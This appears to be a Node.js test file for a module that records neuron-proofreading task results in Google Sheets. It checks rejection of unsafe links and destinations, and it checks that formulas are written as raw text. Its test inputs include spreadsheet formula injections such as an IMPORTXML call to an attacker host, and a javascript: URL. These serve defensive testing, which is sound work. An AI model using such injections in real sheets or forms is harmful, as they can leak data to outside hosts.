const {test}=require('node:test');
const assert=require('node:assert/strict');
const {sourceFor,sheetValues,planSheetUpdate}=require('./sheet-policy');
const input={dataset:'pinky_nf_v2',segmentId:'123',action:'complete'};
const me={id:'mine',display_name:'=IMPORTXML("https://attacker", "x")'};
const task={assigned_to:'mine',dataset:input.dataset,segment_id:'123',status:'completed',final_segment_id:'456',soma_coords:'1, 2, 3'};
test('reject arbitrary destinations, actions and other users',()=>{
 assert.throws(()=>sourceFor({...input,dataset:'https://evil'}));
 assert.throws(()=>sourceFor({...input,action:'write'}));
 assert.throws(()=>sheetValues(input,me,{...task,assigned_to:'someone-else'},'now'));
 assert.throws(()=>sheetValues(input,me,{...task,status:'assigned'},'now'));
});
test('matches exact source IDs, quotes titles, preserves existing values and writes formulas as RAW text',()=>{
 const grid=[['Final SegID','Start SegID','Proofreader','Status','Soma coords'],['','123','','','existing'],['','1234','','','']];
 const plan=planSheetUpdate(grid,"Amy's cells",'123',sheetValues(input,me,task,'now'));
 assert.equal(plan.valueInputOption,'RAW');
 assert.deepEqual(plan.data.map(x=>x.range),["'Amy''s cells'!C2","'Amy''s cells'!D2","'Amy''s cells'!A2"]);
 assert.equal(plan.data[0].values[0][0],me.display_name);
 assert.throws(()=>planSheetUpdate([...grid,grid[1]],'cells','123',[]));
});
test('complete writes the Final Link column, https only, never Start link',()=>{
 const link='https://spelunker.cave-explorer.org/#!middleauth+https://global.daf-apis.com/nglstate/api/v1/123';
 const grid=[['Start SegID','Start link','Status','Final SegID','Final Link'],['123','https://old','','','']];
 const plan=planSheetUpdate(grid,'cells','123',sheetValues({...input,link},me,task,'now'));
 const byCol=Object.fromEntries(plan.data.map(x=>[x.range.split('!')[1][0],x.values[0][0]]));
 assert.equal(byCol.E,link);
 assert.equal(byCol.B,undefined);
 for(const bad of ['http://x.test','javascript:alert(1)','=IMPORTXML("https://a","b")','https://a b']) assert.throws(()=>sheetValues({...input,link:bad},me,task,'now'),/https link/);
 assert.doesNotThrow(()=>sheetValues({...input,link:''},me,task,'now'));
});
test('complete on the 2026-09-28 retina sheet writes exactly Proofreader, Status, Date Complete, Final SegID, Final Link, Notes',()=>{
 const header=['Priority (0=highest)','box_name','Index BC Sheet','Index Master','New Index','Soma or stem Coords','Start SegID','Start link','Proofreader','Status','Date Complete','Final SegID','Final Link','Notes','AI-predicted BC type'];
 const row=['12517','Topleft 500x500','BC16931','','','','123','https://start','','','','','','','t3a'];
 const link='https://spelunker.cave-explorer.org/#!middleauth+https://global.daf-apis.com/nglstate/api/v1/9';
 const plan=planSheetUpdate([header,row],'Focused BCs','123',sheetValues({...input,dataset:'stroeh_mouse_retina',link,notes:'  axon  cut\noff '},me,{...task,dataset:'stroeh_mouse_retina'},'9/28/2026'));
 const byHeader=Object.fromEntries([...plan.data,...plan.userEnteredData].map(x=>{const c=x.range.split('!')[1].replace(/\d+$/,'');return [header[c.charCodeAt(0)-65],x.values[0][0]];}));
 assert.deepEqual(Object.keys(byHeader).sort(),['Date Complete','Final Link','Final SegID','Notes','Proofreader','Status']);
 assert.equal(byHeader.Notes,'axon cut off');
 assert.equal(byHeader['Final SegID'],'456');
});
test('completion replaces a Proofreader left by an earlier claim, but never on a completed row',()=>{
 const header=['Start SegID','Proofreader','Status','Final SegID'];
 const celia={id:'mine',display_name:'Celia D'};
 const t={...task,dataset:'stroeh_mouse_retina'};
 const open=planSheetUpdate([header,['123','Amy R. Sterling','','']],'s','123',sheetValues({...input,dataset:'stroeh_mouse_retina'},celia,t,'now'));
 assert.equal(open.data.find(x=>x.range.endsWith('!B2')).values[0][0],'Celia D');
 const done=planSheetUpdate([header,['123','Amy R. Sterling','Complete','']],'s','123',sheetValues({...input,dataset:'stroeh_mouse_retina'},celia,t,'now'));
 assert.equal(done.data.find(x=>x.range.endsWith('!B2')),undefined);
 const claim=planSheetUpdate([header,['123','Amy R. Sterling','','']],'s','123',sheetValues({...input,dataset:'stroeh_mouse_retina',action:'claim'},celia,{...t,status:'assigned'},'now'));
 assert.equal(claim.data.find(x=>x.range.endsWith('!B2')),undefined);
});
test('the completion date is entered as a real date only when it is a plain M/D/YYYY value',()=>{
 const header=['Start SegID','Status','Date Complete'];
 const ok=planSheetUpdate([header,['123','','']],'s','123',sheetValues(input,me,task,'9/28/2026'));
 assert.deepEqual(ok.userEnteredData.map(x=>x.values[0][0]),['9/28/2026']);
 assert.equal(ok.data.some(x=>x.values[0][0]==='9/28/2026'),false);
 const odd=planSheetUpdate([header,['123','','']],'s','123',sheetValues(input,me,task,'=NOW()'));
 assert.equal(odd.userEnteredData.length,0);
 assert.equal(odd.valueInputOption,'RAW');
});
